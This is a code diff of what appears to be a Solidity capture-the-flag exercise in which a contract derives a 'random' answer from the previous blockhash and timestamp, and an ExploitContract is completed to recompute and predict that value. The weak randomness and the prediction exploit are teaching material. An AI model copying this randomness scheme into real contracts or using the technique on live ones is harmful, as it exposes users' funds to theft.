@@ -6,16 +6,7 @@ contract GuessRandomNumber {
 
     constructor() payable {
         require(msg.value == 1 ether);
-        answer = uint8(
-            uint256(
-                keccak256(
-                    abi.encodePacked(
-                        blockhash(block.number - 1),
-                        block.timestamp
-                    )
-                )
-            )
-        );
+        answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
     }
 
     function isComplete() public view returns (bool) {
@@ -36,9 +27,9 @@ contract GuessRandomNumber {
 contract ExploitContract {
     GuessRandomNumber public guessRandomNumber;
     uint8 public answer;
-
+    receive() external payable {}
     function Exploit() public returns (uint8) {
-        
+        answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
         return answer;
     }
 }
